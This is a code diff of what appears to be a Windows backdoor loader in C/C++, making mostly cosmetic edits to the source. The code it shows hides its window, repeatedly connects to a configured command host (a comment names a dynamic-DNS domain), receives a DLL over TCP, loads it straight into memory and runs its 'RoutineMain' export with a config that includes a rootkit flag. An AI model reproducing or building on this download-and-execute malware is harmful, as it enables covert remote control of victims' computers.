@@ -8,9 +8,10 @@
 #endif
 
 #define DE
-#include "..\\..\\debug.h"
+#include "..//..//debug.h"
 
 #include "MemLoadDll.h"
+#include <tchar.h>
 
 typedef struct _MsgHead
 {
@@ -31,7 +32,7 @@ struct DLL_INFO
 	char Dllname[50];
 	char ReMark[50];
 	bool isRootkit;
-}SysInfo =
+} SysInfo =
 {
 	"StartOfHostAndConfig",
 	"127.0.0.1",		//127.0.0.1 192.168.1.145 lkyfire.vicp.net
@@ -63,12 +64,12 @@ unsigned long WINAPI resolve(char *host)
 		return 0;
 	}
 
-	return i = (*(unsigned long *)ser->h_addr);
+	return i = *(unsigned long *)ser->h_addr;
 }
 
 DWORD _stdcall ConnectThread(LPVOID lParam)
 {
-	SOCKET h = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+	SOCKET h = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
 
 	SOCKADDR_IN addr;
 	addr.sin_family = AF_INET;
@@ -120,9 +121,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 	shutdown(h, 0);
 	closesocket(h);
 
-	HMEMORYMODULE hModule;
-
-	hModule = MemoryLoadLibrary(buf);
+	HMEMORYMODULE hModule = MemoryLoadLibrary(buf);
 
 	if (hModule == NULL)
 	{
@@ -132,7 +131,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 		return 0;
 	}
 
-	typedef BOOL(*_RoutineMain)(LPVOID lp);
+	typedef BOOL(*_RoutineMain)(LPVOID);
 	_RoutineMain RoutineMain = (_RoutineMain)MemoryGetProcAddress(hModule, "RoutineMain");
 
 	RoutineMain(&SysInfo);
@@ -159,7 +158,7 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 		NULL,
 		GetModuleHandleW(0),
 		NULL
-		);
+	);
 
 	ShowWindow(hwnd, SW_HIDE);
 	UpdateWindow(hwnd);
@@ -172,7 +171,7 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 	WSADATA lpWSAData;
 	WSAStartup(MAKEWORD(2, 2), &lpWSAData);
 
-	while (1)
+	while (true)
 	{
 		__try
 		{
@@ -185,8 +184,4 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 
 		Sleep(500);
 	}
-
-	WSACleanup();
-
-	return 0;
 }
